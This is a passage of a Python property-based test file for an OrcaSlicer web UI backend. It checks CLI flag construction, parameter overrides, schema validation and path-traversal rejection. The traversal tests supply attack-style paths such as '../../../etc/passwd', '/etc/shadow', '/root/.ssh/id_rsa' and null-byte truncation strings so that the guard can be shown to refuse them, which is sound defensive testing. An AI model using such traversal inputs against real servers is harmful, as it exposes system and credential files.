                blacklist_characters=['/', '\\', '\x00']
            )
        ).map(lambda s: s + ".json"),
        process_profile_name=st.text(
            min_size=1,
            max_size=30,
            alphabet=st.characters(
                whitelist_categories=('Lu', 'Ll', 'Nd'),
                blacklist_characters=['/', '\\', '\x00']
            )
        ).map(lambda s: s + ".json"),
        num_filaments=st.integers(min_value=1, max_value=5),
        run_id=st.integers(min_value=0, max_value=1000000),
    )
    def test_property_4_profile_flags_appear_correctly(
        self,
        tmp_path,
        printer_profile_name,
        process_profile_name,
        num_filaments,
        run_id
    ):
        """
        **Property 4: Profile paths appear as correct CLI flags**
        
        For any valid job request with printer, process, and filament profiles,
        verify that:
        1. --load_settings appears exactly twice (printer and process)
        2. Each --load_settings is followed by the correct absolute profile path
        3. --load_filaments appears once for each filament profile
        4. Each --load_filaments is followed by the correct absolute filament path
        
        **Validates: Requirements 2.4**
        """
        config = MockConfig(tmp_path)
        session_dir = config.tmp_root / "sessions" / f"s{run_id}"
        session_dir.mkdir(parents=True, exist_ok=True)
        output_dir = config.tmp_root / "jobs" / f"j{run_id}" / "output"
        output_dir.mkdir(parents=True, exist_ok=True)
        
        # Create manufacturer directory
        manufacturer = f"TestManufacturer{run_id}"
        manufacturer_dir = config.profiles_root / manufacturer
        manufacturer_dir.mkdir(parents=True, exist_ok=True)
        
        # Create printer profile
        printer_profile = manufacturer_dir / printer_profile_name
        printer_profile.touch(exist_ok=True)
        printer_profile_relative = f"{manufacturer}/{printer_profile_name}"
        
        # Create process profile
        process_profile = manufacturer_dir / process_profile_name
        process_profile.touch(exist_ok=True)
        process_profile_relative = f"{manufacturer}/{process_profile_name}"
        
        # Create filament profiles
        filament_profiles = []
        filament_profiles_relative = []
        for i in range(num_filaments):
            filament_name = f"filament{i}.json"
            filament_path = manufacturer_dir / filament_name
            filament_path.touch(exist_ok=True)
            filament_profiles.append(filament_path)
            filament_profiles_relative.append(f"{manufacturer}/{filament_name}")
        
        # Build job request
        job = {
            "file_ids": [],
            "action": "slice",
            "printer_profile_path": printer_profile_relative,
            "process_profile_path": process_profile_relative,
            "filament_profile_paths": filament_profiles_relative,
        }
        
        # Build CLI args
        args = build_cli_args(job, config, {}, output_dir)
        
        # Verify structure
        assert isinstance(args, list), "CLI args should be a list"
        assert all(isinstance(arg, str) for arg in args), "All args should be strings"
        
        # The real OrcaSlicer CLI takes ONE --load-settings flag with a
        # semicolon-separated file list (printer;process), and ONE
        # --load-filaments flag with a semicolon-separated filament list —
        # not repeated flags per file (see cli_builder.py's comment on
        # `--load-settings "setting1.json;setting2.json"`).
        load_settings_count = args.count("--load-settings")
        assert load_settings_count == 1, (
            f"Expected exactly 1 --load-settings flag (printer;process joined), "
            f"but found {load_settings_count}"
        )
        
        load_filaments_count = args.count("--load-filaments")
        assert load_filaments_count == 1, (
            f"Expected exactly 1 --load-filaments flag ({num_filaments} filaments joined), "
            f"but found {load_filaments_count}"
        )
        
        # Verify the --load-settings value is "printer;process" in that order.
        load_settings_idx = args.index("--load-settings")
        assert load_settings_idx + 1 < len(args), "Expected value after --load-settings"
        load_settings_value = args[load_settings_idx + 1]
        assert load_settings_value == f"{printer_profile};{process_profile}", (
            f"Expected --load-settings value '{printer_profile};{process_profile}', "
            f"but found {load_settings_value!r}"
        )
        
        # Verify the --load-filaments value contains every filament path,
        # semicolon-joined in order.
        load_filaments_idx = args.index("--load-filaments")
        assert load_filaments_idx + 1 < len(args), "Expected value after --load-filaments"
        load_filaments_value = args[load_filaments_idx + 1]
        expected_filaments_value = ";".join(str(p) for p in filament_profiles)
        assert load_filaments_value == expected_filaments_value, (
            f"Expected --load-filaments value {expected_filaments_value!r}, "
            f"but found {load_filaments_value!r}"
        )
        
        # Verify paths are absolute and within profiles_root
        for profile_path in [printer_profile, process_profile] + filament_profiles:
            assert profile_path.is_absolute(), (
                f"Profile path {profile_path} should be absolute"
            )
            # Verify it's within profiles_root
            try:
                profile_path.relative_to(config.profiles_root)
            except ValueError:
                pytest.fail(
                    f"Profile path {profile_path} is not within profiles_root "
                    f"{config.profiles_root}"
                )


class TestParameterOverridePropertyTests:
    """
    Property-based tests for parameter override handling.
    
    Property 7: Parameter overrides appear as --key=value in CLI args
    
    For any map of valid parameter keys to values {k₁: v₁, …, kₙ: vₙ} where
    every key is in PARAM_ALLOWLIST, the constructed CLI args list shall contain
    the string --kᵢ=vᵢ for every i, and shall not contain any string of the form
    --k=v for keys not in the map.
    
    Validates: Requirements 3.4
    """

    # Feature: orca-slicer-web-ui, Property 7: Parameter overrides appear as --key=value in CLI args
    @settings(
        max_examples=100,
        deadline=timedelta(seconds=5),
        suppress_health_check=[HealthCheck.function_scoped_fixture]
    )
    @given(
        overrides=st.dictionaries(
            keys=st.sampled_from([
                "layer_height", "fill_density", "infill_speed", "support_enable",
                "temperature", "bed_temperature", "retraction_length", "print_speed",
                "wall_thickness", "top_bottom_thickness", "infill_pattern",
                "support_type", "brim_width", "skirt_distance", "z_offset",
                "flow_ratio", "fan_speed", "bridge_speed", "travel_speed"
            ]),
            values=st.one_of(
                st.floats(min_value=0.0, max_value=1000.0, allow_nan=False, allow_infinity=False),
                st.integers(min_value=0, max_value=10000),
                st.booleans(),
                st.text(alphabet=st.characters(blacklist_characters=['\x00', '\n', '\r', '=']), 
                       min_size=1, max_size=50)
            ),
            min_size=1,
            max_size=10
        )
    )
    def test_property_7_parameter_overrides_appear_as_flags(self, overrides):
        """
        **Property 7: Parameter overrides appear as --key=value in CLI args**
        
        Generate dictionaries of allowlisted key/value pairs and verify each
        appears as --key=value in the constructed CLI arguments.
        
        Validates: Requirements 3.4
        """
        import tempfile
        
        with tempfile.TemporaryDirectory() as tmp_dir:
            tmp_path = Path(tmp_dir)
            config = MockConfig(tmp_path)
            session_dir = config.tmp_root / "sessions" / "s1"
            session_dir.mkdir(parents=True)
            output_dir = config.tmp_root / "jobs" / "j1" / "output"
            output_dir.mkdir(parents=True)
            
            job = {
                "file_ids": [],
                "action": "slice",
                "parameter_overrides": overrides,
            }
            
            args = build_cli_args(job, config, {}, output_dir)
            
            # Verify each override appears as --key-with-dashes=value (CLI
            # flag names always replace underscores with dashes — see
            # ConfigOptionDef::cli_args, libslic3r/Config.cpp:238-254).
            for key, value in overrides.items():
                cli_flag = key.replace("_", "-")
                expected_arg = f"--{cli_flag}={value}"
                assert expected_arg in args, (
                    f"Expected {expected_arg!r} in CLI args for override {key}={value!r}"
                )
            
            # Verify no other parameter flags appear (keys not in overrides)
            # Get all keys that appear in args with the pattern --<key>=
            args_str = " ".join(args)
            for key in overrides.keys():
                cli_flag = key.replace("_", "-")
                # Count occurrences - should be exactly 1
                count = args_str.count(f"--{cli_flag}=")
                assert count == 1, (
                    f"Parameter {key} should appear exactly once, found {count} times"
                )
            
            # Sample of keys that should NOT appear if not in overrides
            all_possible_keys = {
                "layer_height", "fill_density", "infill_speed", "support_enable",
                "temperature", "bed_temperature", "retraction_length", "print_speed",
                "wall_thickness", "top_bottom_thickness", "infill_pattern",
                "support_type", "brim_width", "skirt_distance", "z_offset",
                "flow_ratio", "fan_speed", "bridge_speed", "travel_speed"
            }
            keys_not_in_overrides = all_possible_keys - set(overrides.keys())
            
            for key in keys_not_in_overrides:
                cli_flag = key.replace("_", "-")
                assert f"--{cli_flag}=" not in args_str, (
                    f"Parameter {key} should not appear in CLI args when not in overrides"
                )

    # Feature: orca-slicer-web-ui, Property 7: Parameter overrides appear as --key=value in CLI args
    @settings(
        max_examples=100,
        deadline=timedelta(seconds=5),
        suppress_health_check=[HealthCheck.function_scoped_fixture]
    )
    @given(
        num_overrides=st.integers(min_value=0, max_value=20),
        key_value_gen=st.data()
    )
    def test_property_7_empty_overrides_produce_no_flags(self, num_overrides, key_value_gen):
        """
        **Property 7: Parameter overrides appear as --key=value in CLI args**
        
        When no overrides are provided, no parameter flags should appear.
        """
        import tempfile
        
        with tempfile.TemporaryDirectory() as tmp_dir:
            tmp_path = Path(tmp_dir)
            config = MockConfig(tmp_path)
            session_dir = config.tmp_root / "sessions" / "s1"
            session_dir.mkdir(parents=True)
            output_dir = config.tmp_root / "jobs" / "j1" / "output"
            output_dir.mkdir(parents=True)
            
            # Generate overrides based on num_overrides
            if num_overrides == 0:
                overrides = {}
            else:
                available_keys = [
                    "layer_height", "fill_density", "infill_speed", "support_enable",
                    "temperature", "bed_temperature", "retraction_length", "print_speed"
                ]
                selected_keys = key_value_gen.draw(
                    st.lists(st.sampled_from(available_keys), 
                            min_size=min(num_overrides, len(available_keys)),
                            max_size=min(num_overrides, len(available_keys)),
                            unique=True)
                )
                overrides = {
                    key: key_value_gen.draw(
                        st.one_of(
                            st.floats(min_value=0.0, max_value=100.0, allow_nan=False, allow_infinity=False),
                            st.integers(min_value=0, max_value=1000),
                            st.booleans()
                        )
                    )
                    for key in selected_keys
                }
            
            job = {
                "file_ids": [],
                "action": "slice",
                "parameter_overrides": overrides,
            }
            
            args = build_cli_args(job, config, {}, output_dir)
            args_str = " ".join(args)
            
            # Count how many parameter override flags appear
            # Parameter overrides look like --<key-with-dashes>=<value>
            # We check that the count matches the number of overrides
            parameter_flag_count = 0
            for key in overrides.keys():
                cli_flag = key.replace("_", "-")
                if f"--{cli_flag}=" in args_str:
                    parameter_flag_count += 1
            
            assert parameter_flag_count == len(overrides), (
                f"Expected {len(overrides)} parameter flags, found {parameter_flag_count}"
            )

    # Feature: orca-slicer-web-ui, Property 7: Parameter overrides appear as --key=value in CLI args
    @settings(
        max_examples=100,
        deadline=timedelta(seconds=5),
        suppress_health_check=[HealthCheck.function_scoped_fixture]
    )
    @given(
        param_key=st.sampled_from([
            "layer_height", "infill_density", "support_enable", "temperature"
        ]),
        param_value=st.one_of(
            st.floats(min_value=-1000.0, max_value=1000.0, allow_nan=False, allow_infinity=False),
            st.integers(min_value=-1000, max_value=10000),
            st.booleans(),
            st.text(min_size=0, max_size=100)
        )
    )
    def test_property_7_single_override_correct_format(self, param_key, param_value):
        """
        **Property 7: Parameter overrides appear as --key=value in CLI args**
        
        Test that a single parameter override is correctly formatted.
        """
        import tempfile
        
        with tempfile.TemporaryDirectory() as tmp_dir:
            tmp_path = Path(tmp_dir)
            config = MockConfig(tmp_path)
            session_dir = config.tmp_root / "sessions" / "s1"
            session_dir.mkdir(parents=True)
            output_dir = config.tmp_root / "jobs" / "j1" / "output"
            output_dir.mkdir(parents=True)
            
            job = {
                "file_ids": [],
                "action": "slice",
                "parameter_overrides": {param_key: param_value},
            }
            
            args = build_cli_args(job, config, {}, output_dir)
            
            # Check the exact format (CLI flag uses dashes, not underscores)
            cli_flag = param_key.replace("_", "-")
            expected_arg = f"--{cli_flag}={param_value}"
            assert expected_arg in args, (
                f"Expected exact argument {expected_arg!r} in CLI args"
            )
            
            # Verify it appears exactly once
            count = args.count(expected_arg)
            assert count == 1, f"Expected argument to appear once, found {count} times"


class TestPathTraversalPropertyTests:
    """
    Property-based tests for path traversal protection.
    
    Property 15: Path traversal is rejected for all user-supplied paths
    
    For any string supplied as a file path, profile path, or output path —
    including strings containing `../`, absolute paths outside the workspace,
    and null-byte sequences — `resolve_and_guard` shall raise `ValueError`
    when the resolved path falls outside the designated root directory.
    
    Validates: Requirements 11.3
    """

    @settings(
        max_examples=100, 
        deadline=timedelta(seconds=5),
        suppress_health_check=[HealthCheck.function_scoped_fixture]
    )
    @given(path_suffix=st.text(
        min_size=1, 
        max_size=100,
        alphabet=st.characters(blacklist_characters=['\x00'])  # Filter out null bytes
    ))
    def test_property_15_parent_directory_traversal_rejected(self, tmp_path, path_suffix):
        """
        **Property 15: Path traversal is rejected for all user-supplied paths**
        
        Generate arbitrary path strings with ../ patterns and verify they are rejected.
        """
        root = tmp_path / "workspace"
        root.mkdir(exist_ok=True)
        
        # Construct path with parent directory traversal
        # Use various patterns to try to escape
        traversal_patterns = [
            f"../{path_suffix}",
            f"../../{path_suffix}",
            f"../../../etc/passwd",
            f"subdir/../../..{path_suffix}",
            f"./../../{path_suffix}",
        ]
        
        for pattern in traversal_patterns:
            with pytest.raises((ValueError, OSError), match="(Path traversal detected|embedded null character)"):
                resolve_and_guard(Path(pattern), root)

    @settings(
        max_examples=100, 
        deadline=timedelta(seconds=5),
        suppress_health_check=[HealthCheck.function_scoped_fixture]
    )
    @given(absolute_path=st.sampled_from([
        "/etc/passwd",
        "/etc/shadow",
        "/root/.ssh/id_rsa",
        "/var/log/system.log",
        "/home/user/.bashrc",
        "/tmp/malicious",
        "/usr/bin/evil",
    ]))
    def test_property_15_absolute_paths_outside_root_rejected(self, tmp_path, absolute_path):
        """
        **Property 15: Path traversal is rejected for all user-supplied paths**
        
        Generate absolute paths outside workspace and verify they are rejected.
        """
        root = tmp_path / "workspace"
        root.mkdir(exist_ok=True)
        
        # Absolute paths outside the workspace should be rejected
        with pytest.raises(ValueError, match="Path traversal detected"):
            resolve_and_guard(Path(absolute_path), root)

    @settings(
        max_examples=100, 
        deadline=timedelta(seconds=5),
        suppress_health_check=[HealthCheck.function_scoped_fixture]
    )
    @given(filename=st.text(min_size=1, max_size=50).filter(lambda s: '\x00' not in s))
    def test_property_15_null_byte_sequences_rejected(self, tmp_path, filename):
        """
        **Property 15: Path traversal is rejected for all user-supplied paths**
        
        Generate paths with null bytes to attempt path truncation attacks.
        Note: Python's Path() handles null bytes by raising ValueError on resolution.
        """
        root = tmp_path / "workspace"
        root.mkdir(exist_ok=True)
        
        # Add null byte to try path truncation attack
        malicious_path = f"{filename}\x00malicious_suffix"
        
        # Path resolution should fail or reject the path
        # Python pathlib will raise an exception on null bytes
        try:
            result = resolve_and_guard(Path(malicious_path), root)
            # If it doesn't raise during Path construction, it should at least
            # not create a valid path
            pytest.fail(f"Expected path with null byte to be rejected, got {result}")
        except (ValueError, OSError):
            # Expected: null bytes should cause failure
            pass

    @settings(
        max_examples=100, 
        deadline=timedelta(seconds=5),
        suppress_health_check=[HealthCheck.function_scoped_fixture]
    )
    @given(
        num_parents=st.integers(min_value=1, max_value=10),
        suffix=st.text(alphabet=st.characters(blacklist_characters=['\x00', '\n', '\r']), 
                      min_size=0, max_size=20)
    )
    def test_property_15_deeply_nested_parent_traversal(self, tmp_path, num_parents, suffix):
        """
        **Property 15: Path traversal is rejected for all user-supplied paths**
        
        Generate paths with varying numbers of ../ to escape the workspace.
        """
        root = tmp_path / "workspace"
        root.mkdir(exist_ok=True)
        
        # Create a path with N levels of parent directory traversal
        parent_path = "/".join([".."] * num_parents)
        if suffix:
            test_path = f"{parent_path}/{suffix}"
        else:
            test_path = parent_path
        
        # Should be rejected if it escapes the root
        # First, let's check if this path would escape
        try:
            resolved = (root / test_path).resolve()
            # Check if it's outside root
            try:
                resolved.relative_to(root.resolve())
                # It's inside root, so resolve_and_guard should succeed
                result = resolve_and_guard(Path(test_path), root)
                assert result is not None
            except ValueError:
                # It's outside root, so resolve_and_guard should raise
                with pytest.raises(ValueError, match="Path traversal detected"):
                    resolve_and_guard(Path(test_path), root)
        except (OSError, ValueError):
            # Path construction/resolution failed, which is also acceptable
            pass

    @settings(
        max_examples=100, 
        deadline=timedelta(seconds=5),
        suppress_health_check=[HealthCheck.function_scoped_fixture]
    )
    @given(
        path_components=st.lists(
            st.text(alphabet=st.characters(
                blacklist_categories=['Cc', 'Cs'],  # Control and surrogate chars
                blacklist_characters=['/', '\x00']
            ), min_size=1, max_size=20),
            min_size=1,
            max_size=5
        )
    )
    def test_property_15_mixed_traversal_patterns(self, tmp_path, path_components):
        """
        **Property 15: Path traversal is rejected for all user-supplied paths**
        
        Generate complex paths mixing normal components with .. traversal attempts.
        """
        root = tmp_path / "workspace"
        root.mkdir(exist_ok=True)
        
        # Insert .. at various positions
        modified_components = path_components.copy()
        # Add .. at the beginning to try to escape
        modified_components.insert(0, "..")
        
        test_path = "/".join(modified_components)
        
        # Try to resolve and guard
        try:
            resolved = (root / test_path).resolve()
            # Check if outside root
            try:
                resolved.relative_to(root.resolve())
                # Inside root - should succeed
                result = resolve_and_guard(Path(test_path), root)
                assert result is not None
            except ValueError:
                # Outside root - should be rejected
                with pytest.raises(ValueError, match="Path traversal detected"):
                    resolve_and_guard(Path(test_path), root)
        except (OSError, ValueError):
            # Path resolution failed, which is fine
            pass

    @settings(
        max_examples=100, 
        deadline=timedelta(seconds=5),
        suppress_health_check=[HealthCheck.function_scoped_fixture]
    )
    @given(malicious_suffix=st.text(
        min_size=1, 
        max_size=50,
        alphabet=st.characters(blacklist_characters=['\x00', '/', '\\'])  # Filter problematic chars
    ))
    def test_property_15_workspace_similar_prefix_rejected(self, tmp_path, malicious_suffix):
        """
        **Property 15: Path traversal is rejected for all user-supplied paths**
        
        Verify that paths in directories with similar names to workspace are rejected.
        E.g., /app/workspace-other should not be accessible from /app/workspace root.
        """
        root = tmp_path / "workspace"
        root.mkdir(exist_ok=True)
        
        # Create a sibling directory with similar name
        similar_dir = tmp_path / f"workspace-{malicious_suffix}"
        similar_dir.mkdir(exist_ok=True)
        
        # Try to access the similar directory
        malicious_file = similar_dir / "secret.txt"
        
        with pytest.raises(ValueError, match="Path traversal detected"):
            resolve_and_guard(malicious_file, root)


class TestSchemaValidationPropertyTests:
    """
    Property-based tests for schema validation preventing CLI invocation.
    
    Property 14: Schema validation prevents CLI invocation on malformed requests
    
    For any job request with a missing required field, an invalid field type,
    or a value outside the Pydantic model's constraints, POST /api/jobs shall
    return HTTP 422 and the CLI process shall not be spawned.
    
    Validates: Requirements 11.1
    """

    @settings(
        max_examples=100,
        deadline=timedelta(seconds=5),
        suppress_health_check=[HealthCheck.function_scoped_fixture]
    )
    @given(
        # Generate various invalid job requests
        data=st.data(),
        mutation_type=st.sampled_from([
            "missing_file_ids",
            "file_ids_not_list",
            "file_ids_empty",
            "file_ids_invalid_uuid",
            "missing_printer_profile",
            "missing_process_profile",
            "missing_filament_profiles",
            "filament_profiles_not_list",
            "filament_profiles_empty",
            "invalid_action",
            "action_not_string",
            "plate_number_negative",
            "plate_number_not_int",
            "parameter_overrides_not_dict",
            "transforms_invalid_type",
            "misc_debug_out_of_range",
            "misc_debug_not_int",
            "action_flags_not_dict",
        ])
    )
    def test_property_14_malformed_requests_return_422_no_subprocess(
        self, tmp_path, data, mutation_type
    ):
        """
        **Property 14: Schema validation prevents CLI invocation on malformed requests**
        
        Generate job requests with various types of malformations and verify:
        1. The API returns HTTP 422 Unprocessable Entity
        2. No subprocess is spawned (tracked via mock)
        3. The error message is descriptive
        
        **Validates: Requirements 11.1**
        """
        import uuid
        from unittest.mock import AsyncMock, patch, MagicMock
        from fastapi.testclient import TestClient
        
        # Initialize auth
        from app.auth import init_auth
        init_auth("test-secret-prop14")
        
        # Track subprocess invocations
        subprocess_called = False
        
        def mock_submit(job_dict, session_id):
            nonlocal subprocess_called
            subprocess_called = True
            return str(uuid.uuid4())
        
        with patch("app.database.init_db", new_callable=AsyncMock), \
             patch("app.cleanup.run_cleanup_loop", return_value=AsyncMock()):
            
            # Mock JobManager to track if it's called
            mock_job_manager = MagicMock()
            mock_job_manager.submit = AsyncMock(side_effect=mock_submit)
            
            with patch("app.job_manager.JobManager", return_value=mock_job_manager):
                from app.main import app
                from app.database import get_db
                
                # Mock database - return that files/profiles exist
                async def mock_get_db():
                    mock_db = AsyncMock()
                    mock_cursor = AsyncMock()
                    mock_cursor.__aenter__ = AsyncMock(return_value=mock_cursor)
                    mock_cursor.__aexit__ = AsyncMock(return_value=None)
                    
                    # Return file exists
                    mock_cursor.fetchone = AsyncMock(return_value=(str(uuid.uuid4()),))
                    mock_db.execute = MagicMock(return_value=mock_cursor)
                    yield mock_db
                
                app.dependency_overrides[get_db] = mock_get_db
                
                # Mock profiles_root to exist
                with patch("app.config.settings") as mock_settings:
                    profiles_root = tmp_path / "profiles"
                    profiles_root.mkdir(parents=True, exist_ok=True)
                    
                    # Create dummy profile files
                    manufacturer_dir = profiles_root / "test_manufacturer"
                    manufacturer_dir.mkdir(parents=True, exist_ok=True)
                    (manufacturer_dir / "printer.json").touch()
                    (manufacturer_dir / "process.json").touch()
                    (manufacturer_dir / "filament.json").touch()
                    
                    mock_settings.profiles_root = profiles_root
                    
                    try:
                        client = TestClient(app)
                        
                        # Build a base valid request
                        valid_request = {
                            "file_ids": [str(uuid.uuid4())],
                            "printer_profile_path": "test_manufacturer/printer.json",
                            "process_profile_path": "test_manufacturer/process.json",
                            "filament_profile_paths": ["test_manufacturer/filament.json"],
                            "action": "slice",
                        }
                        
                        # Mutate the request based on mutation_type
                        malformed_request = valid_request.copy()
                        
                        if mutation_type == "missing_file_ids":
                            del malformed_request["file_ids"]
                        elif mutation_type == "file_ids_not_list":
                            malformed_request["file_ids"] = "not-a-list"
                        elif mutation_type == "file_ids_empty":
                            malformed_request["file_ids"] = []
                        elif mutation_type == "file_ids_invalid_uuid":
                            malformed_request["file_ids"] = ["not-a-valid-uuid"]
                        elif mutation_type == "missing_printer_profile":
                            del malformed_request["printer_profile_path"]
                        elif mutation_type == "missing_process_profile":
                            del malformed_request["process_profile_path"]
                        elif mutation_type == "missing_filament_profiles":
                            del malformed_request["filament_profile_paths"]
                        elif mutation_type == "filament_profiles_not_list":
                            malformed_request["filament_profile_paths"] = "not-a-list"
                        elif mutation_type == "filament_profiles_empty":
                            malformed_request["filament_profile_paths"] = []
                        elif mutation_type == "invalid_action":
                            malformed_request["action"] = "invalid_action_type"
                        elif mutation_type == "action_not_string":
                            malformed_request["action"] = 12345
                        elif mutation_type == "plate_number_negative":
                            malformed_request["plate_number"] = -1
                        elif mutation_type == "plate_number_not_int":
                            malformed_request["plate_number"] = "not-an-int"
                        elif mutation_type == "parameter_overrides_not_dict":
                            malformed_request["parameter_overrides"] = "not-a-dict"
                        elif mutation_type == "transforms_invalid_type":
                            malformed_request["transforms"] = "not-a-dict"
                        elif mutation_type == "misc_debug_out_of_range":
                            malformed_request["misc"] = {"debug": 99}  # Should be 0-5
                        elif mutation_type == "misc_debug_not_int":
                            malformed_request["misc"] = {"debug": "not-an-int"}
                        elif mutation_type == "action_flags_not_dict":
                            malformed_request["action_flags"] = "not-a-dict"
                        
                        # Submit the malformed request
                        response = client.post(
                            "/api/jobs",
                            headers={"Authorization": "Bearer test-secret-prop14"},
                            json=malformed_request,
                        )
                        
                        # Assert HTTP 422 is returned
                        assert response.status_code == 422, (
                            f"Expected HTTP 422 for mutation {mutation_type!r}, "
                            f"but got {response.status_code}. "
                            f"Response: {response.text}"
                        )
                        
                        # Assert subprocess was NOT called
                        assert not subprocess_called, (
                            f"Subprocess was invoked despite malformed request "
                            f"(mutation: {mutation_type!r}). Schema validation failed."
                        )
                        
                        # Assert error message is descriptive
                        response_json = response.json()
                        assert "detail" in response_json, (
                            "Response should contain 'detail' field with error description"
                        )
                        
                    finally:
                        app.dependency_overrides.clear()

    @settings(
        max_examples=100,
        deadline=timedelta(seconds=5),
        suppress_health_check=[HealthCheck.function_scoped_fixture]
    )
    @given(
        # Generate random invalid values for various fields
        data=st.data(),
    )
    def test_property_14_wrong_types_rejected(self, tmp_path, data):
        """
        **Property 14: Schema validation prevents CLI invocation on malformed requests**
        
        Generate requests with wrong types for various fields and verify
        Pydantic strict mode rejects them with 422.
        
        **Validates: Requirements 11.1**
        """
        import uuid
        from unittest.mock import AsyncMock, patch, MagicMock
        from fastapi.testclient import TestClient
        
        # Initialize auth
        from app.auth import init_auth
        init_auth("test-secret-prop14-types")
        
        # Track subprocess invocations
        subprocess_called = False
        
        def mock_submit(job_dict, session_id):
            nonlocal subprocess_called
            subprocess_called = True
            return str(uuid.uuid4())
        
        with patch("app.database.init_db", new_callable=AsyncMock), \
             patch("app.cleanup.run_cleanup_loop", return_value=AsyncMock()):
            
            mock_job_manager = MagicMock()
            mock_job_manager.submit = AsyncMock(side_effect=mock_submit)
            
            with patch("app.job_manager.JobManager", return_value=mock_job_manager):
                from app.main import app
                from app.database import get_db
                
                # Mock database
                async def mock_get_db():
                    mock_db = AsyncMock()
                    mock_cursor = AsyncMock()
                    mock_cursor.__aenter__ = AsyncMock(return_value=mock_cursor)
                    mock_cursor.__aexit__ = AsyncMock(return_value=None)
                    mock_cursor.fetchone = AsyncMock(return_value=(str(uuid.uuid4()),))
                    mock_db.execute = MagicMock(return_value=mock_cursor)
                    yield mock_db
                
                app.dependency_overrides[get_db] = mock_get_db
                
                try:
                    client = TestClient(app)
                    
                    # Generate wrong-typed values for different fields
                    wrong_type_mutations = [
                        # file_ids should be list[str], but provide int
                        {"file_ids": 12345},
                        # printer_profile_path should be str, but provide int
                        {"printer_profile_path": 12345},
                        # process_profile_path should be str, but provide bool
                        {"process_profile_path": True},
                        # filament_profile_paths should be list[str], but provide int
                        {"filament_profile_paths": 999},
                        # action should be Literal, but provide int
                        {"action": 42},
                        # plate_number should be int, but provide string
                        {"plate_number": "five"},
                        # parameter_overrides should be dict, but provide list
                        {"parameter_overrides": ["not", "a", "dict"]},
                        # transforms should be dict/object, but provide list
                        {"transforms": ["invalid"]},
                        # misc should be dict/object, but provide string
                        {"misc": "not-a-dict"},
                        # action_flags should be dict/object, but provide int
                        {"action_flags": 123},
                    ]
                    
                    # Pick one mutation randomly
                    mutation = data.draw(st.sampled_from(wrong_type_mutations))
                    
                    # Build base request with the mutation
                    malformed_request = {
                        "file_ids": [str(uuid.uuid4())],
                        "printer_profile_path": "test/printer.json",
                        "process_profile_path": "test/process.json",
                        "filament_profile_paths": ["test/filament.json"],
                        "action": "slice",
                    }
                    malformed_request.update(mutation)
                    
                    # Submit the request
                    response = client.post(
                        "/api/jobs",
                        headers={"Authorization": "Bearer test-secret-prop14-types"},
                        json=malformed_request,
                    )
                    
                    # Assert HTTP 422
                    assert response.status_code == 422, (
                        f"Expected HTTP 422 for wrong type mutation {mutation}, "
                        f"but got {response.status_code}"
                    )
                    
                    # Assert subprocess NOT called
                    assert not subprocess_called, (
                        "Subprocess should not be invoked for wrong-typed fields"
                    )
                    
                finally:
                    app.dependency_overrides.clear()

    @settings(
        max_examples=100,
        deadline=timedelta(seconds=5),
        suppress_health_check=[HealthCheck.function_scoped_fixture]
    )
    @given(
        # Generate out-of-range values
        plate_number=st.integers(min_value=-1000, max_value=-1),
        repetitions=st.integers(min_value=-1000, max_value=0),
        debug_level=st.integers().filter(lambda x: x < 0 or x > 5),
    )
    def test_property_14_out_of_range_values_rejected(
        self, tmp_path, plate_number, repetitions, debug_level
    ):
        """
        **Property 14: Schema validation prevents CLI invocation on malformed requests**
        
        Generate requests with out-of-range numeric values and verify they are
        rejected with 422.
        
        **Validates: Requirements 11.1**
        """
        import uuid
        from unittest.mock import AsyncMock, patch, MagicMock
        from fastapi.testclient import TestClient
        
        # Initialize auth
        from app.auth import init_auth
        init_auth("test-secret-prop14-range")
        
        subprocess_called = False
        
        def mock_submit(job_dict, session_id):
            nonlocal subprocess_called
            subprocess_called = True
            return str(uuid.uuid4())
        
        with patch("app.database.init_db", new_callable=AsyncMock), \
             patch("app.cleanup.run_cleanup_loop", return_value=AsyncMock()):
            
            mock_job_manager = MagicMock()
            mock_job_manager.submit = AsyncMock(side_effect=mock_submit)
            
            with patch("app.job_manager.JobManager", return_value=mock_job_manager):
                from app.main import app
                from app.database import get_db
                
                async def mock_get_db():
                    mock_db = AsyncMock()
                    mock_cursor = AsyncMock()
                    mock_cursor.__aenter__ = AsyncMock(return_value=mock_cursor)
                    mock_cursor.__aexit__ = AsyncMock(return_value=None)
                    mock_cursor.fetchone = AsyncMock(return_value=(str(uuid.uuid4()),))
                    mock_db.execute = MagicMock(return_value=mock_cursor)
                    yield mock_db
                
                app.dependency_overrides[get_db] = mock_get_db
                
                try:
                    client = TestClient(app)
                    
                    # Test plate_number out of range (negative)
                    request1 = {
                        "file_ids": [str(uuid.uuid4())],
                        "printer_profile_path": "test/printer.json",
                        "process_profile_path": "test/process.json",
                        "filament_profile_paths": ["test/filament.json"],
                        "action": "slice",
                        "plate_number": plate_number,  # Negative, should fail
                    }
                    
                    response1 = client.post(
                        "/api/jobs",
                        headers={"Authorization": "Bearer test-secret-prop14-range"},
                        json=request1,
                    )
                    
                    assert response1.status_code == 422
                    assert not subprocess_called
                    
                    # Reset flag
                    subprocess_called = False
                    
                    # Test repetitions out of range (non-positive)
                    request2 = {
                        "file_ids": [str(uuid.uuid4())],
                        "printer_profile_path": "test/printer.json",
                        "process_profile_path": "test/process.json",
                        "filament_profile_paths": ["test/filament.json"],
                        "action": "slice",
                        "transforms": {
                            "repetitions": repetitions,  # Non-positive, should fail
                        },
                    }
                    
                    response2 = client.post(
                        "/api/jobs",
                        headers={"Authorization": "Bearer test-secret-prop14-range"},
                        json=request2,
                    )
                    
                    assert response2.status_code == 422
                    assert not subprocess_called
                    
                    # Reset flag
                    subprocess_called = False
                    
                    # Test debug level out of range (not 0-5)
                    request3 = {
                        "file_ids": [str(uuid.uuid4())],
                        "printer_profile_path": "test/printer.json",
                        "process_profile_path": "test/process.json",
                        "filament_profile_paths": ["test/filament.json"],
                        "action": "slice",
                        "misc": {
                            "debug": debug_level,  # Not in 0-5, should fail
                        },
                    }
                    
                    response3 = client.post(
                        "/api/jobs",
                        headers={"Authorization": "Bearer test-secret-prop14-range"},
                        json=request3,
                    )
                    
                    assert response3.status_code == 422
                    assert not subprocess_called
                    
                finally:
                    app.dependency_overrides.clear()


class TestParameterKeyAllowlistPropertyTests:
    """
    Property-based tests for parameter key allowlist enforcement.
    
    Property 16: Parameter key allowlist is enforced
    
    For any parameter key string not present in PARAM_ALLOWLIST, including keys
    that differ by case, whitespace, or special characters, POST /api/jobs shall
    return HTTP 422 and the CLI shall not be invoked.
    
    Validates: Requirements 11.4
    """

    @settings(
        max_examples=100,
        deadline=timedelta(seconds=5),
        suppress_health_check=[HealthCheck.function_scoped_fixture]
    )
    @given(
